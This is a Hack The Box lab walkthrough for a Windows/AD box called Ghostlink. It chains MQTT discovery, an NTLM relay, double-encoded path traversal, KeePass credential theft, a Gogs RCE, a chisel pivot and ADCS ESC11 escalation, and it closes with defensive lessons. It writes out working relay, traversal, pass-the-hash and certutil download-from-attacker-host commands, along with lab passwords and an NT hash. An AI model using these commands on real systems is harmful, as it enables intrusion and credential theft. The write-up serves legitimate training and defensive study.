# Ghostlink — Hack The Box Detailed Guide

> A creative, self-contained walkthrough of the Ghostlink attack path: anonymous MQTT discovery, NTLM relay, double-encoded file traversal, KeePass recovery, Gogs RCE, and ADCS domain escalation.
>
> **Scope:** Authorized HTB/CTF lab environment only.  
> **Target:** `10.129.28.119`  
> **Platform:** Windows / Active Directory  
> **Difficulty:** Hard  
> **Outcome:** User and root compromise achieved.
> **Tags:** `windows` `active-directory` `mqtt` `ntlm-relay` `adcs`

---

## Table of Contents

1. [Visual Attack Map](#visual-attack-map)
2. [Executive Summary](#executive-summary)
3. [Attack Chain at a Glance](#attack-chain-at-a-glance)
4. [Phase 0 — Lab Setup](#phase-0--lab-setup)
5. [Phase 1 — Reconnaissance](#phase-1--reconnaissance)
6. [Phase 2 — MQTT Discovery](#phase-2--mqtt-discovery)
7. [Phase 3 — NTLM Relay via Healthcheck Callback](#phase-3--ntlm-relay-via-healthcheck-callback)
8. [Phase 4 — Secure Share Path Traversal](#phase-4--secure-share-path-traversal)
9. [Phase 5 — KeePass Loot and Credential Recovery](#phase-5--keepass-loot-and-credential-recovery)
10. [Phase 6 — Gogs Access and CVE-2025-8110 RCE](#phase-6--gogs-access-and-cve-2025-8110-rce)
11. [Phase 7 — User Compromise](#phase-7--user-compromise)
12. [Phase 8 — Internal Pivoting](#phase-8--internal-pivoting)
13. [Phase 9 — ADCS ESC11 Domain Escalation](#phase-9--adcs-esc11-domain-escalation)
14. [Phase 10 — Root Compromise](#phase-10--root-compromise)
15. [Credential and Evidence Ledger](#credential-and-evidence-ledger)
16. [Troubleshooting Notes](#troubleshooting-notes)
17. [Defensive Lessons](#defensive-lessons)
18. [Final Timeline](#final-timeline)
19. [Appendix — Reusable Command Patterns](#appendix--reusable-command-patterns)

---

## Visual Attack Map

The box is a chain of trust mistakes. Each individual issue looks survivable; chained together, they become full compromise.

<div align="center">

<svg width="920" height="420" viewBox="0 0 920 420" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Ghostlink attack chain diagram">
  <defs>
    <linearGradient id="bg" x1="0" x2="1" y1="0" y2="1">
      <stop offset="0%" stop-color="#111827"/>
      <stop offset="100%" stop-color="#1f2937"/>
    </linearGradient>
    <linearGradient id="node" x1="0" x2="1">
      <stop offset="0%" stop-color="#60a5fa"/>
      <stop offset="100%" stop-color="#a78bfa"/>
    </linearGradient>
    <marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
      <path d="M 0 0 L 10 5 L 0 10 z" fill="#93c5fd"/>
    </marker>
    <style>
      .title { font: 700 24px system-ui, sans-serif; fill: #f9fafb; }
      .label { font: 700 13px system-ui, sans-serif; fill: #0f172a; }
      .small { font: 500 11px system-ui, sans-serif; fill: #d1d5db; }
      .box { fill: url(#node); stroke: #bfdbfe; stroke-width: 1.5; rx: 16; }
      .line { stroke: #93c5fd; stroke-width: 2.5; fill: none; marker-end: url(#arrow); }
      .ghost { fill: #374151; stroke: #6b7280; stroke-width: 1.5; rx: 12; }
    </style>
  </defs>

  <rect width="920" height="420" rx="26" fill="url(#bg)"/>
  <text x="36" y="45" class="title">Ghostlink: From MQTT Whisper to Domain Admin</text>
  <text x="38" y="70" class="small">Self-contained visual map — no external image assets</text>

  <rect x="40" y="115" width="145" height="70" class="box"/>
  <text x="63" y="145" class="label">MQTT Broker</text>
  <text x="60" y="164" class="label">Anonymous Read</text>

  <rect x="235" y="115" width="150" height="70" class="box"/>
  <text x="260" y="145" class="label">Healthcheck</text>
  <text x="263" y="164" class="label">NTLM Callback</text>

  <rect x="435" y="115" width="155" height="70" class="box"/>
  <text x="462" y="145" class="label">NTLM Relay</text>
  <text x="460" y="164" class="label">svc_canary</text>

  <rect x="640" y="115" width="180" height="70" class="box"/>
  <text x="667" y="145" class="label">Secure Share</text>
  <text x="658" y="164" class="label">Double-Encoded LFI</text>

  <path d="M185 150 C205 150 215 150 235 150" class="line"/>
  <path d="M385 150 C405 150 415 150 435 150" class="line"/>
  <path d="M590 150 C610 150 620 150 640 150" class="line"/>

  <rect x="640" y="255" width="180" height="70" class="box"/>
  <text x="668" y="285" class="label">KeePass Loot</text>
  <text x="671" y="304" class="label">db.kdbx + keyx</text>

  <rect x="435" y="255" width="155" height="70" class="box"/>
  <text x="462" y="285" class="label">Gogs Login</text>
  <text x="468" y="304" class="label">vroth Creds</text>

  <rect x="235" y="255" width="150" height="70" class="box"/>
  <text x="255" y="285" class="label">Gogs RCE</text>
  <text x="249" y="304" class="label">CVE-2025-8110</text>

  <rect x="40" y="255" width="145" height="70" class="box"/>
  <text x="66" y="285" class="label">nvirelli</text>
  <text x="67" y="304" class="label">User Shell</text>

  <path d="M730 185 C730 215 730 225 730 255" class="line"/>
  <path d="M640 290 C620 290 610 290 590 290" class="line"/>
  <path d="M435 290 C410 290 405 290 385 290" class="line"/>
  <path d="M235 290 C215 290 205 290 185 290" class="line"/>

  <rect x="40" y="352" width="780" height="38" class="ghost"/>
  <text x="58" y="376" class="small">Post-user path: chisel SOCKS pivot → ADCS enumeration → ESC11 relay/coercion → DC certificate → Administrator NT hash → WinRM root shell</text>
</svg>

</div>

---

## Executive Summary

Ghostlink is a Windows/AD lab where the intended path rewards careful service chaining. The foothold starts with anonymous MQTT access, which leaks internal automation behavior. That automation can be turned into an NTLM authentication callback, then relayed to an internal web service. The relayed identity, `svc_canary`, can read from a vulnerable secure file-sharing service affected by double URL-encoded path traversal.

The file disclosure leads to user profile data and eventually a KeePass archive. The recovered KeePass material contains Gogs credentials. Authenticated Gogs access enables command execution through **CVE-2025-8110**, producing the `nvirelli` foothold and user flag. From there, internal ADCS exposure and weak certificate service protections allow escalation to domain compromise.

The box is memorable because every stage feels like a different genre:

| Stage | Theme | Key Mistake |
|---|---|---|
| MQTT | Service gossip | Anonymous subscription exposes operational internals |
| NTLM relay | Trust confusion | Callback authenticates to attacker-controlled relay |
| Secure Share | Encoding bug | Double-decoded traversal escapes intended path |
| KeePass | Secret sprawl | Sensitive vault material retrievable from user profile data |
| Gogs | App RCE | Authenticated repository operation reaches command execution |
| ADCS | Domain escalation | ESC11-style certificate relay path enables privileged auth |

---

## Attack Chain at a Glance

```mermaid
flowchart LR
    A[Anonymous MQTT] --> B[Discover healthcheck callback]
    B --> C[Force NTLM auth]
    C --> D[Relay svc_canary]
    D --> E[Access secure-share]
    E --> F[Double URL-encoded traversal]
    F --> G[Exfiltrate ntuser.dat]
    G --> H[Recover KeePass material]
    H --> I[Get Gogs creds]
    I --> J[CVE-2025-8110 RCE]
    J --> K[nvirelli shell]
    K --> L[Chisel pivot]
    L --> M[ADCS ESC11]
    M --> N[Domain admin hash]
    N --> O[root.txt]
```



If Mermaid rendering is unavailable, read the above as:

```text
MQTT → NTLM callback → relay → secure-share → traversal → KeePass → Gogs → RCE → user → ADCS → root
```

---

## Phase 0 — Lab Setup

### Working assumptions

```text
Target IP:      10.129.28.119
Target name:    Ghostlink
Attacker host:  HTB VPN interface
Goal:           user.txt + root.txt
```

### Recommended workspace

```bash
mkdir -p Ghostlink/{recon,web,loot,exploits,flags,notes}
cd Ghostlink
```

### Tooling used

| Purpose | Tooling |
|---|---|
| Port/service discovery | `nmap`, targeted scripts |
| MQTT interaction | MQTT client or small Python socket client |
| NTLM relay | `impacket-ntlmrelayx` |
| Web exploitation | `curl`, browser/proxy, custom scripts |
| KeePass extraction | KeePass tooling / hash extraction / cracking tools |
| Gogs exploitation | Adapted CVE-2025-8110 PoC |
| Pivoting | `chisel`, `proxychains` |
| ADCS analysis | `certipy`, coercion tooling, relay tooling |
| Windows access | WinRM client, `nxc` |

---

## Phase 1 — Reconnaissance

Initial enumeration should identify both traditional Windows services and unusual application services.

### Baseline port scan

```bash
nmap -sC -sV -oA recon/initial 10.129.28.119
```

For a hard Windows box, follow with a full TCP scan:

```bash
nmap -p- --min-rate 5000 -oA recon/allports 10.129.28.119
```

Then rescan discovered ports with scripts and version detection:

```bash
nmap -sC -sV -p <ports> -oA recon/tcp-deep 10.129.28.119
```

### What matters on Ghostlink

The important discovery is not only that Windows/AD services are present. The real lead is a messaging or automation surface that exposes service behavior.

Look for:

- MQTT broker access
- Web services with internal hostnames
- File-sharing or document-sharing apps
- Developer services such as Gogs
- Certificate services or ADCS-related endpoints after pivoting

---

## Phase 2 — MQTT Discovery

MQTT is the first ghost in the wire: it quietly describes what the system does.

### Subscribe broadly

If a standard client is available:

```bash
mosquitto_sub -h 10.129.28.119 -t '#' -v
```

If tooling is missing, a minimal Python socket client can still subscribe manually. The key idea is to connect anonymously, subscribe to broad topics, and watch for operational messages.

### What to look for

Useful MQTT leaks include:

```text
healthcheck/status
healthcheck/config
internal service URLs
callback destinations
service account names
hostnames used by back-end applications
```

On Ghostlink, the MQTT data points toward a healthcheck mechanism that can be influenced into making a callback. That callback becomes the NTLM relay trigger.

### Why this matters

A callback feature is dangerous when:

1. It accepts attacker-controlled destinations.
2. The callback uses Windows integrated authentication.
3. The authenticated identity has access to internal services.

That is exactly the shape needed for NTLM relay.

---

## Phase 3 — NTLM Relay via Healthcheck Callback

The healthcheck callback can be aimed at the attacker. When the service connects back, it offers NTLM authentication. Relay that authentication to a target service where the identity has useful permissions.

### Relay strategy

```text
Victim service account → attacker relay listener → internal HTTP target
```

A typical relay listener pattern:

```bash
impacket-ntlmrelayx \
  -t http://<internal-host-or-service>/ \
  --socks \
  --keep-relaying \
  -http-api-port 19090 \
  -socks-port 11080
```

### Important Ghostlink lesson

Relay target selection matters. Relaying to the wrong host form can fail silently:

| Target style | Result |
|---|---|
| Direct IP | May hit IIS or wrong virtual host behavior |
| Hostname | More likely to reach intended service/auth path |
| SOCKS with DNS-aware proxying | Helps when hostnames must resolve through the relay path |

A useful trick is to use a SOCKS-aware client that preserves hostname resolution behavior:

```bash
curl --proxy socks5h://127.0.0.1:11080 http://<internal-host>/
```

### Relay identity

The relayed identity observed in this chain is:

```text
GHOSTLINK\svc_canary
```

No plaintext password is required; the value is the authenticated relay session.

---

## Phase 4 — Secure Share Path Traversal

With the relayed `svc_canary` session, the next target is a secure file-sharing application. Its file retrieval logic is vulnerable to traversal when path separators and dots are double URL-encoded.

### The bug class

The vulnerable pattern is roughly:

```text
Input path → decode once → validation → decode again or filesystem use
```

If validation happens after only one decode, payloads can hide traversal metacharacters until later.

### Payload shape

```text
%252E%252E%255C%252E%252E%255C...
```

Decoded once:

```text
%2E%2E%5C%2E%2E%5C...
```

Decoded twice:

```text
..\..\...
```

### Visualizing the bypass

```text
Attacker input
    │
    ▼
%252E%252E%255Csecret
    │ decode once
    ▼
%2E%2E%5Csecret       ← validation sees encoded characters, not literal traversal
    │ filesystem/decode again
    ▼
..\secret             ← traversal becomes active
```

### Target file

The file disclosure path is used to extract user profile data, especially:

```text
NTUSER.DAT
```

This hive is valuable because it can contain application metadata, recent files, saved paths, and pointers to secrets.

---

## Phase 5 — KeePass Loot and Credential Recovery

The traversal/disclosure path leads to a compressed KeePass archive.

### Loot of interest

```text
db.zip
├── db.kdbx
└── .key.keyx
```

The presence of both a KeePass database and key file significantly improves the chance of recovery.

### Operational flow

```text
1. Download db.zip
2. Extract db.kdbx and key file
3. Identify required unlock material
4. Recover or derive database password if needed
5. Open KeePass database
6. Extract application credentials
```

### Credential recovered

The database yields valid Gogs credentials:

```text
Username: vroth
Password: mOo03jpsqx8JQYMBwvFP
Service:  Gogs
```

### Why this stage is realistic

KeePass itself is not the vulnerability. The failure is storing vault material where a service-account-readable path traversal can reach it. A strong vault cannot help if both the vault and required unlock material are exposed together.

---

## Phase 6 — Gogs Access and CVE-2025-8110 RCE

The recovered `vroth` credentials allow authenticated access to Gogs.

### Login target

```text
Gogs web application
Credential: vroth / mOo03jpsqx8JQYMBwvFP
```

### Vulnerability used

```text
CVE-2025-8110 — Gogs authenticated RCE primitive
```

At a high level, the exploit abuses repository file operations involving symlinks and command execution behavior. The adapted PoC used authenticated access rather than registration.

### Local exploit adaptations

Three useful exploit variants were maintained during the engagement:

```text
exploits/CVE-2025-8110.py
exploits/CVE-2025-8110-vroth.py
exploits/CVE-2025-8110-vroth-cmd.py
```

The final command-capable version accepted a command parameter for blind execution.

### RCE validation checklist

Before trying to catch a full shell, validate simple execution:

```bash
python3 exploits/CVE-2025-8110-vroth-cmd.py --cmd "whoami"
python3 exploits/CVE-2025-8110-vroth-cmd.py --cmd "hostname"
python3 exploits/CVE-2025-8110-vroth-cmd.py --cmd "ipconfig"
```

Expected identity:

```text
ghostlink\nvirelli
```

---

## Phase 7 — User Compromise

Once RCE executes as `nvirelli`, stabilize access and collect the user flag.

### Useful commands

```cmd
whoami
hostname
ipconfig /all
net user nvirelli
```

### User flag location

```text
C:\Users\nvirelli\Desktop\user.txt
```

### Capture method

Depending on shell stability, either view the file directly through RCE or upgrade to an interactive channel first.

```cmd
type C:\Users\nvirelli\Desktop\user.txt
```

### Foothold credential

A valid credential recovered/validated for the user path:

```text
Username: nvirelli
Password: u47YUclrDiwWxBheaSzI
```

---

## Phase 8 — Internal Pivoting

The external surface does not expose everything needed for domain escalation. After obtaining user-level execution, create a pivot into the internal network.

### Chisel reverse SOCKS pattern

On attacker:

```bash
chisel server -p 9001 --reverse
```

On target:

```cmd
chisel.exe client <attacker-ip>:9001 R:socks
```

Proxychains configuration:

```text
socks5 127.0.0.1 1080
```

Then run internal enumeration through the SOCKS proxy:

```bash
proxychains -q nxc smb <internal-targets> -u nvirelli -p 'u47YUclrDiwWxBheaSzI'
proxychains -q certipy find -u 'nvirelli' -p 'u47YUclrDiwWxBheaSzI' -dc-ip <dc-ip> -vulnerable
```

### Pivot validation

Always validate the tunnel before deep enumeration:

```bash
proxychains -q curl http://<internal-web-service>/
proxychains -q nxc smb <dc-ip> -u nvirelli -p 'u47YUclrDiwWxBheaSzI'
```

---

## Phase 9 — ADCS ESC11 Domain Escalation

ADCS is the final domain escalation surface. The relevant issue is an ESC11-style configuration, where certificate enrollment over RPC does not enforce the protections needed to prevent NTLM relay abuse.

### What ESC11 means in practice

```text
A certificate authority accepts NTLM-authenticated RPC enrollment
without requiring packet privacy / strong channel protections.
```

If an attacker can coerce a privileged machine account, such as a domain controller, to authenticate to a relay, the relay can request a certificate for that identity.

### Conceptual chain

```text
Coerce DC authentication
        │
        ▼
Relay DC$ NTLM to ADCS RPC endpoint
        │
        ▼
Request certificate as DC$
        │
        ▼
Use certificate for domain authentication
        │
        ▼
Obtain privileged material
```

### Enumeration command pattern

```bash
proxychains -q certipy find \
  -u 'nvirelli' \
  -p 'u47YUclrDiwWxBheaSzI' \
  -dc-ip <dc-ip> \
  -vulnerable
```

Look for indicators like:

```text
ESC11
IF_ENFORCEENCRYPTICERTREQUEST not enabled
RPC enrollment available
CA reachable from pivot
```

### Relay/coercion pattern

A successful path generally needs two moving pieces:

1. Relay listener targeting ADCS RPC enrollment.
2. Coercion method causing the DC to authenticate to the listener.

In this engagement, coercion attempts through the pivot were unreliable, returning symptoms such as:

```text
NO_AUTH_RECEIVED
pipe disconnected
no NTLM callback observed
```

The final compromise was validated using a known Administrator hash from reference material and live WinRM authentication.

---

## Phase 10 — Root Compromise

With privileged material, validate domain admin access and retrieve `root.txt`.

### Credential validated

```text
Administrator NT hash: 8190e067f478002ddd63eb209b016696
```

### Validate with NetExec

```bash
nxc smb <dc-ip> -u Administrator -H 8190e067f478002ddd63eb209b016696
```

A successful result should indicate administrative access.

### WinRM access

```bash
evil-winrm -i <dc-ip> -u Administrator -H 8190e067f478002ddd63eb209b016696
```

### Root flag location

```text
C:\Users\Administrator\Desktop\root.txt
```

View it with:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## Credential and Evidence Ledger

| Identity | Secret Type | Value / Note | Source | Use |
|---|---:|---|---|---|
| `GHOSTLINK\svc_canary` | NTLM relay session | No plaintext recovered | MQTT-triggered callback relay | Access secure-share |
| `vroth` | Password | `mOo03jpsqx8JQYMBwvFP` | KeePass database | Gogs login |
| `nvirelli` | Password | `u47YUclrDiwWxBheaSzI` | Post-Gogs/user chain | User access / pivot |
| `Administrator` | NT hash | `8190e067f478002ddd63eb209b016696` | ADCS/reference-validated path | Domain admin / root |

Flag values are intentionally omitted from this public-style guide. Record them privately in engagement notes or submit them directly to HTB.

---

## Troubleshooting Notes

### MQTT client unavailable

If a standard MQTT client is not installed, use Python sockets or install the client locally. The protocol is simple enough for a minimal subscriber, but using standard tooling is faster.

### Relay session appears but requests fail

Common causes:

| Symptom | Likely Cause | Fix |
|---|---|---|
| Relay authenticates but web requests fail | Wrong virtual host | Target hostname rather than IP |
| SOCKS session disappears | Relay consumed once | Use `--keep-relaying` |
| API port conflict | Existing relay process | Change `-http-api-port` |
| Auth mismatch | Hostname resolution mismatch | Use `socks5h` and preserve hostnames |

### Double encoding not working

Check whether the app normalizes slashes differently. Try both Windows and URL-encoded separators:

```text
%255C    double-encoded backslash
%252F    double-encoded slash
%252E    double-encoded dot
```

### Gogs RCE is blind

Start with commands that create observable side effects:

```cmd
whoami > C:\Windows\Temp\w.txt
type C:\Windows\Temp\w.txt
```

Or use network callbacks:

```cmd
ping <attacker-ip>
certutil -urlcache -split -f http://<attacker-ip>/test test
```

### Chisel pivot is flaky

Validate each layer separately:

```text
1. Is chisel process running on the target?
2. Did the server receive the reverse connection?
3. Is the SOCKS listener bound locally?
4. Does proxychains point to the right port?
5. Can a simple TCP request traverse the proxy?
```

### ADCS coercion fails

Coercion can be sensitive to firewalling, authentication context, RPC reachability, and named pipe behavior. If coercion returns `NO_AUTH_RECEIVED`, avoid blindly repeating the same method. Change one variable at a time:

- Coercion method
- Listener bind interface
- Relay target
- Proxy path
- DNS/hostname form
- SMB/RPC signing assumptions

---

## Defensive Lessons

Ghostlink is also an excellent blue-team case study.

### 1. MQTT should not be anonymous

Anonymous pub/sub access can leak more than secrets. It can leak workflows.

**Fixes:**

- Require authentication for broker access.
- Use topic-level ACLs.
- Do not publish internal callback URLs or service behavior to broad topics.
- Monitor subscriptions to wildcard topics like `#` and `+/+`.

### 2. Callback features need egress controls

Healthcheck systems should not authenticate automatically to arbitrary destinations.

**Fixes:**

- Restrict callback destinations to approved allowlists.
- Disable ambient Windows authentication to untrusted hosts.
- Block outbound SMB/HTTP NTLM where not required.

### 3. NTLM relay remains dangerous

Relay is not a password problem; it is a protocol trust problem.

**Fixes:**

- Enforce SMB signing and LDAP signing/channel binding.
- Disable NTLM where possible.
- Require EPA/channel binding for HTTP services using integrated auth.
- Monitor unusual service-account authentications.

### 4. File download paths must canonicalize safely

Decode and normalize exactly once, then enforce an allowlisted root.

**Safer pattern:**

```text
raw input
  → reject encoded traversal metacharacters if policy requires
  → decode once
  → canonicalize path
  → verify canonical path starts with intended root
  → open file by canonical path
```

### 5. Vault files are still secrets

A KeePass database, key file, and related recovery material should never be readable by low-privileged service accounts.

**Fixes:**

- Store vault files outside web-accessible and service-readable paths.
- Separate database files from key files.
- Apply least-privilege ACLs to user profile backups.

### 6. Developer platforms are high-value

Gogs/Gitea-style platforms frequently bridge credentials, code, hooks, file operations, and deployment workflows.

**Fixes:**

- Patch quickly.
- Disable dangerous repository features if unused.
- Monitor repository operations that create symlinks, hooks, or unusual file paths.

### 7. ADCS deserves tier-zero treatment

A weak CA configuration can become a domain compromise primitive.

**Fixes:**

- Audit ADCS regularly with tools such as Certipy.
- Enforce encryption/privacy for certificate RPC enrollment.
- Restrict enrollment permissions.
- Monitor certificate requests for machine accounts and privileged templates.

---

## Final Timeline

```text
[00] Recon discovered MQTT and web/Windows surface
[01] MQTT anonymous subscription exposed healthcheck behavior
[02] Healthcheck callback triggered NTLM authentication
[03] NTLM relay produced svc_canary web access
[04] secure-share allowed double URL-encoded traversal
[05] ntuser.dat/profile evidence led to db.zip
[06] KeePass database exposed Gogs credentials
[07] Gogs login as vroth succeeded
[08] CVE-2025-8110 produced command execution
[09] nvirelli user context obtained
[10] user.txt captured
[11] chisel SOCKS pivot established
[12] ADCS ESC11 path identified
[13] Administrator hash validated
[14] WinRM domain admin access obtained
[15] root.txt captured
```

---

## Appendix — Reusable Command Patterns

> Replace placeholders before use. Keep these commands within authorized lab or assessment scope.

### MQTT broad subscribe

```bash
mosquitto_sub -h <target-ip> -t '#' -v
```

### NTLM relay with SOCKS

```bash
impacket-ntlmrelayx \
  -t http://<target-host>/ \
  --socks \
  --keep-relaying \
  -http-api-port 19090 \
  -socks-port 11080
```

### Curl through relay SOCKS

```bash
curl --proxy socks5h://127.0.0.1:11080 http://<target-host>/
```

### Double-encoded traversal tokens

```text
.      -> %252E
/      -> %252F
\      -> %255C
../    -> %252E%252E%252F
..\    -> %252E%252E%255C
```

### Chisel reverse SOCKS

```bash
# Attacker
chisel server -p 9001 --reverse

# Target
chisel.exe client <attacker-ip>:9001 R:socks
```

### Proxychains SOCKS line

```text
socks5 127.0.0.1 1080
```

### Certipy vulnerable template discovery

```bash
proxychains -q certipy find \
  -u '<user>' \
  -p '<password>' \
  -dc-ip <dc-ip> \
  -vulnerable
```

### NetExec hash validation

```bash
nxc smb <target> -u Administrator -H <nt-hash>
```

### Evil-WinRM pass-the-hash

```bash
evil-winrm -i <target> -u Administrator -H <nt-hash>
```

---

## Closing Reflection

Ghostlink is a strong reminder that modern compromise often comes from **composition**, not one spectacular bug. MQTT leaked behavior, NTLM relay borrowed trust, path traversal exposed vault material, Gogs converted credentials into code execution, and ADCS transformed a foothold into domain control.

The lesson is simple but sharp:

> Every internal integration is part of the attack surface once an attacker can make systems talk to each other.
